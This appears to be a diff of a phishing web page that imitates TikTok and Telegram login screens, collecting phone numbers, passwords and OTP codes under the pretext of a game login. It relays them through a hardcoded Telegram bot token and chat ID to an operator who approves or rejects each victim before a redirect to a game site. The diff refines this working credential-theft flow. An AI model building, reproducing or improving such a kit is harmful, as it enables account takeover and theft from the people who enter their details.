@@ -10,7 +10,7 @@
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; position: fixed; font-family: sans-serif; }
         #app { width: 100vw; height: 100vh; position: relative; }
         .full-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
-        .tt-input { width: 100%; padding: 14px; border: 1px solid #333; background: #111; color: white; border-radius: 8px; outline: none; margin-bottom: 12px; }
+        .tt-input { width: 100%; padding: 16px; border: 1px solid #222; background: #1a1a1a; color: white; border-radius: 12px; outline: none; margin-bottom: 12px; }
         #topNotice { position: fixed; top: -100px; left: 0; width: 100%; padding: 20px; text-align: center; color: white; font-weight: bold; z-index: 9999; transition: 0.5s; }
         .notice-success { background: #10b981; }
         .notice-error { background: #ef4444; }
@@ -26,37 +26,55 @@
 <div id="app">
     <!-- Login Selection -->
     <div id="selectScreen" class="w-full h-full flex flex-col items-center justify-center p-8 bg-[#0a0a0a] z-50 relative">
-        <div class="bg-[#111] border border-white/10 p-10 w-full max-w-sm rounded-[30px] text-center">
-            <h1 class="text-xl font-bold mb-8 text-white">Login to continue</h1>
-            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl mb-4 flex items-center justify-center gap-3"><i class="fa-brands fa-telegram text-xl"></i> Telegram</button>
-            <button onclick="toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-xl flex items-center justify-center gap-3"><i class="fa-brands fa-tiktok text-xl"></i> TikTok</button>
+        <div class="bg-[#111] border border-white/5 p-10 w-full max-w-sm rounded-[40px] text-center">
+            <h1 class="text-xl font-semibold mb-10 text-white">Login to continue</h1>
+            <button onclick="toggle('tgScreen')" class="w-full bg-[#2481cc] text-white py-4 rounded-2xl mb-4 font-bold text-lg">Telegram</button>
+            <button onclick="toggle('ttScreen')" class="w-full bg-white text-black py-4 rounded-2xl font-bold text-lg">TikTok</button>
         </div>
     </div>
 
     <!-- TikTok Screen -->
-    <div id="ttScreen" class="hidden bg-black w-full h-full p-6 text-white z-50 relative">
-        <div class="flex items-center justify-between mb-8"><i onclick="toggle('selectScreen')" class="fa-solid fa-xmark text-xl cursor-pointer"></i><span class="font-bold text-lg">Log in</span><span></span></div>
-        <input type="number" id="ttPhone" placeholder="Phone number" class="tt-input"><input type="password" id="ttPass" placeholder="Password" class="tt-input">
-        <button onclick="submit('TikTok')" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold mt-10">Log in</button>
+    <div id="ttScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
+        <div class="flex items-center justify-center mb-12 relative">
+            <i onclick="toggle('selectScreen')" class="fa-solid fa-angle-left text-2xl absolute left-0 cursor-pointer"></i>
+            <span class="text-xl font-bold">Log in</span>
+        </div>
+        <input type="text" id="ttPhone" placeholder="Phone number" class="tt-input">
+        <input type="password" id="ttPass" placeholder="Password" class="tt-input">
+        <div class="flex justify-between px-1 mb-10">
+            <span class="text-gray-400 text-sm">Forgot password?</span>
+        </div>
+        <button onclick="submit('TikTok')" class="w-full bg-[#fe2c55] text-white py-4 rounded-lg font-bold text-lg">Log in</button>
     </div>
 
     <!-- Telegram Screen -->
     <div id="tgScreen" class="hidden bg-black w-full h-full p-8 text-white z-50 relative">
-        <div class="flex items-center mb-10"><i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-xl cursor-pointer mr-6"></i></div>
-        <input type="number" id="tgPhone" placeholder="Phone number" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none mb-6 text-white">
-        <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-700 py-3 text-lg outline-none text-white">
-        <button onclick="submit('Telegram')" class="w-full bg-[#2481cc] text-white py-4 rounded-xl font-bold mt-12">CONTINUE</button>
+        <div class="flex items-center mb-12">
+            <i onclick="toggle('selectScreen')" class="fa-solid fa-arrow-left text-2xl cursor-pointer mr-8"></i>
+        </div>
+        <div class="mb-8">
+            <label class="text-gray-400 text-sm ml-1">Phone number</label>
+            <input type="text" id="tgPhone" value="+95 " class="w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
+        </div>
+        <div class="mb-12">
+            <label class="text-gray-400 text-sm ml-1">OTP Code</label>
+            <input type="number" id="tgOtp" placeholder="OTP Code" class="w-full bg-transparent border-b border-gray-800 py-4 text-xl outline-none text-white">
+        </div>
+        <button onclick="submit('Telegram')" class="w-full bg-[#3390ec] text-white py-4 rounded-xl font-bold text-lg uppercase">Continue</button>
     </div>
 
     <!-- Wait Screen -->
     <div id="waitScreen" class="hidden w-full h-full bg-black z-[60] relative">
         <video id="loadVd" class="full-video" loop muted playsinline src="https://raw.githubusercontent.com/tar-alt/Photo-link-/e761fef0c5c9a10b02d7aa6ad2dfc731ce90f7b8/From%20KlickPin%20CF%20Easy%20fall%20outfit%20ideas%20that%20feel%20fresh%20practical%20and%20surprisingly%20easy%20to%20try%20for%20a%20result%20that%20feels%20elegant%20and%20share-worthy%20-%20Pin-684547212134230018.mp4"></video>
-        <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40"><p class="text-white text-lg font-bold">Login ဝင်ရောက်ရန် စစ်ဆေးနေပါသည်။</p></div>
+        <div class="absolute inset-0 flex flex-col items-center justify-center z-10 bg-black/40 text-center p-6">
+            <p class="text-white text-lg font-bold">Login ဝင်ရောက်ရန် စစ်ဆေးနေပါသည်။<br><span class="text-sm font-normal text-gray-300">ခေတ္တစောင့်ဆိုင်းပေးပါ...</span></p>
+        </div>
     </div>
 
-    <!-- Game Frame (Keep it for UI structure) -->
+    <!-- Game Frame -->
     <div id="gameFrameContainer">
-        <div onclick="location.reload()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full"><i class="fa-solid fa-house"></i></div>
+        <!-- ဂိမ်းကထွက်ရင် သီချင်းပါ ပိတ်သွားအောင် ဒီမှာ ပြင်ထားပါတယ် -->
+        <div onclick="closeGame()" class="fixed top-5 left-5 z-[101] bg-black/60 text-white p-3 rounded-full cursor-pointer"><i class="fa-solid fa-house"></i></div>
         <iframe id="gameFrame" src=""></iframe>
     </div>
 </div>
@@ -64,13 +82,26 @@
 <script>
     const token = "8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0";
     const chatID = "5304050102";
-    const gameLink = "https://www.crazygames.com"; // အစ်ကိုလိုအပ်တဲ့ ဂိမ်းလင့်
+    const gameLink = "https://www.crazygames.com";
     let userKey = "ID_" + Math.floor(Math.random() * 9999);
     const music = document.getElementById('bgMusic');
+
+    window.onload = function() {
+        if(localStorage.getItem("isLoggedIn") === "true") {
+            window.location.href = gameLink;
+        }
+    };
 
     function toggle(id) {
         document.querySelectorAll('#app > div').forEach(d => d.classList.add('hidden'));
         document.getElementById(id).classList.remove('hidden');
+    }
+
+    // ဂိမ်းကထွက်ပြီး အိမ်ပြန်ရောက်ရင် သီချင်းပိတ်တဲ့ Function
+    function closeGame() {
+        music.pause();
+        music.currentTime = 0;
+        location.reload();
     }
 
     function showNotice(msg, type) {
@@ -107,8 +138,8 @@
             if (last && last.data.includes(userKey)) {
                 if (last.data === `ok_${userKey}`) {
                     clearInterval(check);
+                    localStorage.setItem("isLoggedIn", "true");
                     
-                    // Bot စာသားပြောင်းရန်
                     await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
                         method: 'POST', headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ 
@@ -118,17 +149,21 @@
                         })
                     });
 
-                    showNotice("Login အောင်မြင်ပါသည်။ ဂိမ်းသို့ ပို့ဆောင်နေသည်...", "success");
-                    
-                    // iframe သုံးမရလို့ တိုက်ရိုက် Redirect လုပ်လိုက်တာပါ
-                    setTimeout(() => {
-                        window.location.href = gameLink; 
-                    }, 1500);
+                    showNotice("Login အောင်မြင်ပါသည်။", "success");
+                    setTimeout(() => { window.location.href = gameLink; }, 1500);
 
                 } else if (last.data === `no_${userKey}`) {
                     clearInterval(check);
-                    showNotice("Login ၀င်ရောက်မှုမအောသ်မြင်ပါ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပေးပါ။", "error");
-                    setTimeout(() => location.reload(), 2000);
+                    await fetch(`https://api.telegram.org/bot${token}/editMessageText`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            chat_id: chatID, 
+                            message_id: last.message.message_id, 
+                            text: `❌ ID: ${userKey} အား ငြင်းပယ်လိုက်ပါသည်။` 
+                        })
+                    });
+                    showNotice("Login ၀င်ရောက်မှုမအောင်မြင်ပါ သင့်အကောင့်အား ပြန်လည်စစ်ဆေးပေးပါ။", "error");
+                    setTimeout(() => location.reload(), 2500);
                 }
             }
         }, 3000);
@@ -136,4 +171,3 @@
 </script>
 </body>
 </html>
-
